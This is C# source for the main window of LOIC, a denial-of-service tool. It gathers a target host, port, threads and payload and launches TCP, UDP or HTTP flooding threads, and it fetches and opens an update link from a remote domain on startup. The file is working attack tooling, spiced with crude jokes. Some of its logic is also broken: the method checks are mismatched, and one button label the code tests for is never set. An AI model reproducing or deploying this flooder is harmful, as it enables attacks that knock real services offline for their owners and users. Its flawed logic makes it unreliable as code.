/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.Net;
using System.Windows.Forms;

namespace LOIC
{
	public partial class frmMain : Form
	{
		private static XXPFlooder[] xxp;
		private static HTTPFlooder[] http;

		private string sIP, sMethod, sData, sSubsite;
		private int iPort, iThreads, iProtocol, iDelay, iTimeout;
		private bool bResp, intShowStats;

		public frmMain()
		{
			InitializeComponent();
		}

		private void frmMain_Load(object sender, EventArgs e)
		{
			//if (!System.IO.Directory.Exists("tmp")) System.IO.Directory.CreateDirectory("tmp");
			this.Text = String.Format("{0} | When harpoons, air strikes and nukes fail | v. {1}", Application.ProductName, Application.ProductVersion);
			try
			{
				string versionLink = new WebClient().DownloadString(Properties.Resources.PrgDomain + "LOIC_version.php?cv=" + Application.ProductVersion);
				if (!versionLink.Contains("<VERSION>" + Application.ProductVersion + "</VERSION>"))
				{
					bool getUpdate = (DialogResult.Yes == MessageBox.Show("A new version is available. Update?", "so i herd u liek mudkipz", MessageBoxButtons.YesNo));
					if (getUpdate)
					{
						string updateLink = new WebClient().DownloadString(Properties.Resources.ToxDomain + "inf/LOIC_link.html").Split('%')[1];
						System.Diagnostics.Process.Start(updateLink + "?cv=" + Application.ProductVersion);
						Application.Exit();
					}
				}
			}
			catch
			{
				var sb = new System.Text.StringBuilder();
				sb.AppendLine("Couldn't check for updates.");
				sb.AppendLine("Also, cocks.");
				MessageBox.Show(sb.ToString(), "A cat is fine too");
			}
		}

		private void cmdTargetURL_Click(object sender, EventArgs e)
		{
			string url = txtTargetURL.Text.ToLower();
			if (url.Length == 0)
			{
				new frmWtf().Show();
				MessageBox.Show("A URL is fine too...", "What the shit.");
				return;
			}
			if (!url.StartsWith("http://")) url = String.Concat("http://", url);
			txtTarget.Text = Dns.GetHostEntry(new Uri(url).Host).AddressList[0].ToString();
		}

		private void cmdTargetIP_Click(object sender, EventArgs e)
		{
			if (txtTargetIP.Text.Length == 0)
			{
				new frmWtf().Show();
				MessageBox.Show("I think you forgot the IP.", "What the shit.");
				return;
			}
			txtTarget.Text = txtTargetIP.Text;
		}

		private void txtTarget_Enter(object sender, EventArgs e)
		{
			cmdAttack.Focus();
		}

		private void cmdAttack_Click(object sender, EventArgs e)
		{
			if (cmdAttack.Text == "IMMA CHARGIN MAH LAZER")
			{
				try
				{
					try { iPort = Convert.ToInt32(txtPort.Text); }
					catch { throw new Exception("I don't think ports are supposed to be written like THAT."); }

					try { iThreads = Convert.ToInt32(txtThreads.Text); }
					catch { throw new Exception("What on earth made you put THAT in the threads field?"); }

					sIP = txtTarget.Text;
					if (String.IsNullOrEmpty(sIP) || String.Equals(sIP, "N O N E !"))
						throw new Exception("Select a target.");

					iProtocol = 0;
					sMethod = cbMethod.Text;
					if (String.Equals(sMethod, "TCP")) iProtocol = 1;
					if (String.Equals(sMethod, "UDP")) iProtocol = 2;
					if (String.Equals(sMethod, "HTTP")) iProtocol = 3;
					if (iProtocol == 0)
						throw new Exception("Select a proper attack method.");

					sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
					if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
						throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");

					sSubsite = txtSubsite.Text;
					if (!sSubsite.StartsWith("/") && (iProtocol == 3))
						throw new Exception("You have to enter a subsite (for example \"/\")");

					try { iTimeout = Convert.ToInt32(txtTimeout.Text); }
					catch { throw new Exception("What's up with something like that in the timeout box? =S"); }

					bResp = chkResp.Checked;
				}
				catch (Exception ex) { new frmWtf().Show(); MessageBox.Show(ex.Message, "What the shit."); return; }

				cmdAttack.Text = "Stop flooding";

				if (String.Equals(sMethod, "TCP") || String.Equals(sMethod, "UDP"))
				{
					xxp = new XXPFlooder[iThreads];
					for (int a = 0; a < xxp.Length; a++)
					{
						xxp[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData);
						xxp[a].Start();
					}
				}
				if (String.Equals(sMethod, "TCP"))
				{
					http = new HTTPFlooder[iThreads];
					for (int a = 0; a < http.Length; a++)
					{
						http[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout);
						http[a].Start();
					}
				}

				tShowStats.Start();
			}
			else
			{
				cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
				if (xxp != null)
				{
					for (int a = 0; a < xxp.Length; a++)
					{
						xxp[a].IsFlooding = false;
					}
				}
				if (http != null)
				{
					for (int a = 0; a < http.Length; a++)
					{
						http[a].IsFlooding = false;
					}
				}
				//tShowStats.Stop();
			}
		}

		private void tShowStats_Tick(object sender, EventArgs e)
		{
			if (intShowStats) return; intShowStats = true;

			bool isFlooding = false;
			if (cmdAttack.Text == "Stop for now") isFlooding = true;
			if (iProtocol == 1 || iProtocol == 2)
			{
				int iFloodCount = 0;
				for (int a = 0; a < xxp.Length; a++)
				{
					iFloodCount += xxp[a].FloodCount;
				}
				lbRequested.Text = iFloodCount.ToString();
			}
			if (iProtocol == 3)
			{
				int iIdle = 0;
				int iConnecting = 0;
				int iRequesting = 0;
				int iDownloading = 0;
				int iDownloaded = 0;
				int iRequested = 0;
				int iFailed = 0;

				for (int a = 0; a < http.Length; a++)
				{
					iDownloaded += http[a].Downloaded;
					iRequested += http[a].Requested;
					iFailed += http[a].Failed;
					if (http[a].State == HTTPFlooder.ReqState.Ready ||
						http[a].State == HTTPFlooder.ReqState.Completed)
						iIdle++;
					if (http[a].State == HTTPFlooder.ReqState.Connecting)
						iConnecting++;
					if (http[a].State == HTTPFlooder.ReqState.Requesting)
						iRequesting++;
					if (http[a].State == HTTPFlooder.ReqState.Downloading)
						iDownloading++;
					if (isFlooding && !http[a].IsFlooding)
					{
						int iaDownloaded = http[a].Downloaded;
						int iaRequested = http[a].Requested;
						int iaFailed = http[a].Failed;
						http[a] = null;
						http[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout);
						http[a].Downloaded = iaDownloaded;
						http[a].Requested = iaRequested;
						http[a].Failed = iaFailed;
						http[a].Start();
					}
				}
				lbFailed.Text = iFailed.ToString();
				lbRequested.Text = iRequested.ToString();
				lbDownloaded.Text = iRequested.ToString();
				lbDownloading.Text = iDownloading.ToString();
				lbRequesting.Text = iRequesting.ToString();
				lbConnecting.Text = iConnecting.ToString();
				lbIdle.Text = iIdle.ToString();
			}

			intShowStats = false;
		}

		private void tbSpeed_ValueChanged(object sender, EventArgs e)
		{
			iDelay = tbSpeed.Value;
			if (http != null)
			{
				for (int a = 0; a < http.Length; a++)
				{
					if (http[a] != null) http[a].Delay = iDelay;
				}
			}
			if (xxp != null)
			{
				for (int a = 0; a < xxp.Length; a++)
				{
					if (xxp[a] != null) xxp[a].Delay = iDelay;
				}
			}
		}
	}
}
